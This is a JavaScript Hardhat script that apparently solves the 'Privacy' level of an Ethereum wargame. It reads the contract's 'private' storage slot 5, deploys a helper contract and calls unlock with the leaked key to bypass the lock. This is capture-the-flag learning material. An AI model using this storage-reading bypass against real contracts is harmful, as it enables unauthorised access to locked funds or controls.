
const { ethers, waffle } = require("hardhat");

const CONTRACT_ADDRESS = "0x32467b43BFa67273FC7dDda0999Ee9A12F2AaA08"; // get from browser console
const PLAYER_ADDRESS = "0x23618e81E3f5cdF7f54C3d65f7FBc0aBf5B21E8f"; // change to your own address

async function main() {

    const provider = waffle.provider
    const signer = await ethers.getSigner(PLAYER_ADDRESS)
    const contract = await ethers.getContractAt("Privacy", CONTRACT_ADDRESS, signer)

    const locked = await contract.locked()
    console.log(`now locked is ${locked}`)

    const key = await provider.getStorageAt(CONTRACT_ADDRESS, 5)
    // const password = key.toString().substring(0, 34)
    // console.log(key.toString().substring(0, 34))

    // deploy unlock contract
    const Factory = await ethers.getContractFactory("PrivacyUnlock")
    const unlockContract = await Factory.deploy(CONTRACT_ADDRESS)
    await unlockContract.deployed()

    // how to convert to bytes16 in js??
    await unlockContract.unlock(key)
    const locked1 = await contract.locked()
    console.log(`now locked is ${locked1}`)


}

main().catch((error) => {
    console.error(error);
    // eslint-disable-next-line no-process-exit
    process.exit(1);

});